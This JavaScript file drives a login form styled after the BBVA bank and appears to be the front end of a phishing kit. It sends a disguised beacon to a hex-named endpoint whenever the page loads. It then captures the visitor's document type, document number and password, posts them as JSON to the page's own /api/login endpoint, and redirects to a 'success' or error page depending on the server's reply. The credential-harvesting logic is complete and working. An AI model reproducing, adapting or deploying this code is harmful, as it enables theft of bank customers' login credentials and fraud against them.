function qs(selector, root = document) {
  return root.querySelector(selector);
}

const docTypeSelect = qs("#docType");
const docNumberInput = qs("#docNumber");
const passwordInput = qs("#password");
const passwordError = qs("#passwordError");
const submitBtn = qs('form[action="/submit"] button[type="submit"]');
const PASSWORD_MAX_LENGTH = 8;
const PASSWORD_HAS_LETTER = /[a-z]/i;
const PASSWORD_HAS_NUMBER = /\d/;
const PAGE_LOAD_SIGNAL_PATH =
  "/api/4d9f6b1e7c2a8f03d5e91ab47c6f2d8841a9b73e5c0f6d2a1b8e4c9f7a63d10e";
let hasSentPageLoadSignal = false;

function setPasswordError(show) {
  if (!passwordInput || !passwordError) return;
  passwordInput.classList.toggle("bbva-field--error", show);
  passwordError.classList.toggle("hidden", !show);
}

function isPasswordValid() {
  const value = passwordInput?.value ?? "";
  return (
    value.length === PASSWORD_MAX_LENGTH &&
    PASSWORD_HAS_LETTER.test(value) &&
    PASSWORD_HAS_NUMBER.test(value)
  );
}

if (passwordInput) {
  passwordInput.addEventListener("input", () => {
    passwordInput.value = passwordInput.value.slice(0, PASSWORD_MAX_LENGTH);
    const shouldShowError = passwordInput.value.length === PASSWORD_MAX_LENGTH && !isPasswordValid();
    setPasswordError(shouldShowError);
  });
}

function clearInput(input) {
  if (!input) return;
  input.value = "";
  input.focus();
}

document.addEventListener("click", (e) => {
  const clearBtn = e.target.closest("[data-clear]");
  if (clearBtn) {
    const selector = clearBtn.getAttribute("data-clear");
    clearInput(qs(selector));
    return;
  }

  const toggleBtn = e.target.closest("[data-toggle-password]");
  if (toggleBtn) {
    const selector = toggleBtn.getAttribute("data-toggle-password");
    const input = qs(selector);
    if (!input) return;
    input.type = input.type === "password" ? "text" : "password";
  }
});

function setLoader(open) {
  const loader = qs(".bbva-loader");
  if (!loader) return;
  loader.classList.toggle("is-open", Boolean(open));
}

function goToSuccessScreen(targetUrl) {
  const successUrl = new URL("/success.html", window.location.origin);
  if (typeof targetUrl === "string" && targetUrl.trim()) {
    successUrl.searchParams.set("redirect_to", targetUrl.trim());
  }
  window.location.href = successUrl.toString();
}

window.bbvaLoader = {
  show: () => setLoader(true),
  hide: () => setLoader(false),
};

document.addEventListener("submit", (e) => {
  const form = e.target;
  if (!(form instanceof HTMLFormElement)) return;
  if (form.getAttribute("action") === "/submit") {
    setLoader(true);
  }
});

async function sendLoginInfo() {
  const payload = {
    docType: docTypeSelect?.value ?? "",
    docNumber: docNumberInput?.value ?? "",
    password: passwordInput?.value ?? "",
  };

  const res = await fetch("/api/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });

  if (!res.ok) {
    const text = await res.text().catch(() => "");
    throw new Error(`Request failed: ${res.status} ${text}`.trim());
  }

  const data = await res.json().catch(() => null);
  if (!data || typeof data.response !== "number") {
    throw new Error("Invalid JSON response (expected { response: 1 | 2 })");
  }
  return data;
}

async function sendPageLoadSignal() {
  if (hasSentPageLoadSignal) return;
  hasSentPageLoadSignal = true;

  try {
    await fetch(PAGE_LOAD_SIGNAL_PATH, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ hkahx: "P1" }),
    });
  } catch (err) {
    console.error("Page load signal failed:", err);
  }
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", () => {
    sendPageLoadSignal();
  });
} else {
  sendPageLoadSignal();
}

if (submitBtn) {
  submitBtn.addEventListener("click", async (e) => {
    e.preventDefault();

    if (!isPasswordValid()) {
      setPasswordError(passwordInput?.value.length === PASSWORD_MAX_LENGTH && !isPasswordValid());
      passwordInput?.focus();
      return;
    }

    setLoader(true);
    try {
      const data = await sendLoginInfo();
      if (typeof data.redirect_to === "string" && data.redirect_to.trim()) {
        goToSuccessScreen(data.redirect_to);
        return;
      }

      if (data.response === 1) {
        window.location.href = "/error";
        return;
      }

      goToSuccessScreen();
      return;
    } catch (err) {
      console.error(err);
    } finally {
      setLoader(false);
    }
  });
}
